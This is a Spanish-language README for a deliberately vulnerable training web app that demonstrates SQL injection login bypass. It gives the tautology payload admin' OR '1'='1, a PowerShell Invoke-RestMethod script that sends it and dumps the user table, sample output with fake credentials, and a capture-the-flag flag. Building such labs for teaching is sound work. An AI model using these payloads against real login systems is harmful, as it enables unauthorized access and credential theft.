# Nexus Cloud Solutions 🌐 — Laboratorio de Inyección SQL (SQLi)

Plataforma web con aspecto y comportamiento 100% corporativo diseñada para la demostración, auditoría y explotación de **Inyección SQL (SQLi)** en mecanismos de autenticación, ejecutada **directamente desde PowerShell** (`Invoke-RestMethod`, scripts `.ps1`, etc.) sin necesidad de Bash ni herramientas adicionales.

Totalmente optimizada para desplegarse en **Vercel** usando Serverless Functions en Node.js.

---

## ⚡ Auditoría Automatizada desde PowerShell (`test-lab.ps1`)

El proyecto incluye un script de auditoría automatizado para evaluar la vulnerabilidad SQLi con un solo comando:

```powershell
# Ejecutar la prueba contra tu despliegue en Vercel
.\test-lab.ps1 -BaseUrl "https://TU-DOMINIO.vercel.app"

# Si estás ejecutando en local (localhost:3000):
.\test-lab.ps1
```

---

## 🎯 Demostración y Prueba Manual de SQLi desde PowerShell

### Endpoint Vulnerable
* **URL:** `POST /api/login`
* **Tipo:** Inyección SQL basada en bypass de autenticación (Tautología en cláusula WHERE).

### Ejecución en PowerShell (`Invoke-RestMethod`):

```powershell
# Payload de evasión de autenticación
$body = @{
    username = "admin' OR '1'='1"
    password = "cualquiercosa"
} | ConvertTo-Json

$response = Invoke-RestMethod -Uri "https://TU-DOMINIO.vercel.app/api/login" -Method Post -ContentType "application/json" -Body $body

# Mostrar el resultado obtenido y el usuario autenticado
$response | Format-List
$response.user | Format-List

# Ver la tabla completa de usuarios extraída de la base de datos
$response.database.records | Format-Table id, username, role, email, password_hash -AutoSize
```

### Respuesta esperada en PowerShell:
```powershell
id username      role               email                    password_hash
-- --------      ----               -----                    -------------
 1 admin         SuperAdministrator admin@nexuscloud.corp    $2y$12$e8Y5... (dragon2024)
 2 soporte       SupportTech        soporte@nexuscloud.corp   $2y$12$k9L2... (password123)
 3 operador      Operator           operador@nexuscloud.corp  $2y$12$m4N1... (operador2024)
 4 ciso_auditor  Auditor            security@nexuscloud.corp  $2y$12$p7X9... (NexusSec#99)
```

---

## 💻 Prueba en la Interfaz Web Gráfica

1. Entra a tu sitio web (`https://TU-DOMINIO.vercel.app`).
2. Ve a la sección **Acceso a Clientes**.
3. En el formulario de inicio de sesión ingresa:
   * **Usuario:** `admin' OR '1'='1`
   * **Contraseña:** *(Cualquier valor)*
4. Pulsa **Ingresar al Panel**.
5. Se abrirá la consola de administración con las estadísticas corporativas y la bandera:
   `FLAG-SQLI{nexus_sql_injection_bypass_success}`.

---

## 🚀 Despliegue en Vercel desde PowerShell

1. Confirma los cambios y súbelos a tu repositorio de GitHub:
   ```powershell
   git add .
   git commit -m "Laboratorio centrado exclusivamente en SQLi"
   git push origin main
   ```
2. Entra en [vercel.com/new](https://vercel.com/new) e importa tu repositorio `lopezjesus-cyber/vul_web`.
3. Vercel desplegará automáticamente la aplicación frontend y la función serverless `/api/login` con HTTPS habilitado.
